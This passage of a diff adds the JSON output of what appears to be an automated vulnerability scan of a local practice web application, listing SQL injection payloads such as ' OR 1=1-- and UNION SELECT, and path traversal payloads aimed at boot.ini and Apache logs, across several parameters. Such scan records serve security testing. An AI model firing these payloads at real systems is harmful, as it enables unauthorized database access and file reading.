+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' UNION SELECT NULL--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4385
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:00",
+        "unix_timestamp": 1770474300
+      }
+    },
+    {
+      "id": 65,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4374
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:01",
+        "unix_timestamp": 1770474301
+      }
+    },
+    {
+      "id": 66,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "-1 UNION SELECT 1,2,3--",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4387
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:01",
+        "unix_timestamp": 1770474301
+      }
+    },
+    {
+      "id": 67,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4372
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:03",
+        "unix_timestamp": 1770474303
+      }
+    },
+    {
+      "id": 68,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "name"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4376
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:03",
+        "unix_timestamp": 1770474303
+      }
+    },
+    {
+      "id": 69,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "txtName",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "txtName"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:14",
+        "unix_timestamp": 1770474314
+      }
+    },
+    {
+      "id": 70,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "txtName",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "txtName"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:15",
+        "unix_timestamp": 1770474315
+      }
+    },
+    {
+      "id": 71,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "txtName",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "txtName"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:17",
+        "unix_timestamp": 1770474317
+      }
+    },
+    {
+      "id": 72,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "txtName",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "txtName"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:18",
+        "unix_timestamp": 1770474318
+      }
+    },
+    {
+      "id": 73,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "txtName",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "txtName"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:19",
+        "unix_timestamp": 1770474319
+      }
+    },
+    {
+      "id": 74,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "mtxMessage",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "mtxMessage"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:28",
+        "unix_timestamp": 1770474328
+      }
+    },
+    {
+      "id": 75,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "mtxMessage",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "mtxMessage"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:29",
+        "unix_timestamp": 1770474329
+      }
+    },
+    {
+      "id": 76,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "mtxMessage",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "mtxMessage"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:31",
+        "unix_timestamp": 1770474331
+      }
+    },
+    {
+      "id": 77,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "mtxMessage",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "mtxMessage"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:32",
+        "unix_timestamp": 1770474332
+      }
+    },
+    {
+      "id": 78,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_s/",
+      "parameter": "mtxMessage",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "mtxMessage"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5001
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:25:33",
+        "unix_timestamp": 1770474333
+      }
+    },
+    {
+      "id": 79,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "parameter": "token",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "token"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4348
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:13",
+        "unix_timestamp": 1770474373
+      }
+    },
+    {
+      "id": 80,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "parameter": "token",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "token"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4348
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:13",
+        "unix_timestamp": 1770474373
+      }
+    },
+    {
+      "id": 81,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "parameter": "token",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "token"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4348
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:15",
+        "unix_timestamp": 1770474375
+      }
+    },
+    {
+      "id": 82,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "parameter": "token",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "token"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4348
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:16",
+        "unix_timestamp": 1770474376
+      }
+    },
+    {
+      "id": 83,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/javascript/",
+      "parameter": "token",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "token"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 4348
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:18",
+        "unix_timestamp": 1770474378
+      }
+    },
+    {
+      "id": 84,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/security.php",
+      "parameter": "security",
+      "payload": "' OR 1=1#",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "security"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5395
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:44",
+        "unix_timestamp": 1770474404
+      }
+    },
+    {
+      "id": 85,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/security.php",
+      "parameter": "security",
+      "payload": "' OR 1=1--",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "security"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5395
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:44",
+        "unix_timestamp": 1770474404
+      }
+    },
+    {
+      "id": 86,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/security.php",
+      "parameter": "security",
+      "payload": "1 OR 1=1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "security"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5395
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:46",
+        "unix_timestamp": 1770474406
+      }
+    },
+    {
+      "id": 87,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/security.php",
+      "parameter": "security",
+      "payload": "1' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "security"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5395
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:47",
+        "unix_timestamp": 1770474407
+      }
+    },
+    {
+      "id": 88,
+      "vulnerability_type": "SQLI",
+      "endpoint": "http://127.0.0.1:8080/security.php",
+      "parameter": "security",
+      "payload": "' OR '1'='1",
+      "confidence": 75,
+      "request": {
+        "method": "POST",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "security"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 5395
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:26:49",
+        "unix_timestamp": 1770474409
+      }
+    },
+    {
+      "id": 89,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../../../../../apache/logs/error.log",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:45",
+        "unix_timestamp": 1770474465
+      }
+    },
+    {
+      "id": 90,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../../../../../../../../../../../../boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:45",
+        "unix_timestamp": 1770474465
+      }
+    },
+    {
+      "id": 91,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../../../../apache/logs/error.log",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:46",
+        "unix_timestamp": 1770474466
+      }
+    },
+    {
+      "id": 92,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../../apache/logs/error.log",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:46",
+        "unix_timestamp": 1770474466
+      }
+    },
+    {
+      "id": 93,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "..//..//..//..//..//boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:46",
+        "unix_timestamp": 1770474466
+      }
+    },
+    {
+      "id": 94,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../apache/logs/error.log",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:47",
+        "unix_timestamp": 1770474467
+      }
+    },
+    {
+      "id": 95,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "/../../../../../../../../../../../boot.ini",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Cookie": "[REDACTED - Contains session data]"
+        },
+        "body_parameter": "doc"
+      },
+      "response": {
+        "status_code": 200,
+        "content_length": 15381
+      },
+      "bypass": {
+        "used": false,
+        "type": null
+      },
+      "timestamps": {
+        "detected_at": "2026-02-07 15:27:47",
+        "unix_timestamp": 1770474467
+      }
+    },
+    {
+      "id": 96,
+      "vulnerability_type": "LFI",
+      "endpoint": "http://127.0.0.1:8080/instructions.php",
+      "parameter": "doc",
+      "payload": "../../../apache/logs/error.log",
+      "confidence": 75,
+      "request": {
+        "method": "GET",
